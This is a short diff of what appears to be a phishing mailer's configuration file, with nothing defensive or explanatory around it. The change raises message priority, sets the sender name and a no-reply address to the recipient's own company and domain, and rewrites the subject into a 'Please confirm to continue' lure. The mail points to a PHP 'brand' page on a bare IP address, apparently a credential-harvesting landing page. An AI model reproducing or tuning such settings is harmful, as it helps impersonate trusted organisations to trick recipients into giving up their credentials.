@@ -10,12 +10,12 @@ password :
 fromemail : 
 secure : False
 authy : False
-priority : LOW
+priority : HIGH
 
 [SEND INFO]
-name : 
-subject :  Akaunto ni kansuru jūyōna messēji
-fromemail : {email}
+name : {companyname} .
+subject :  [{email}]: Please confirm to continue.
+fromemail : no-reply@{domain}
 
 link : http://34.125.88.117/brand/brand.php
 
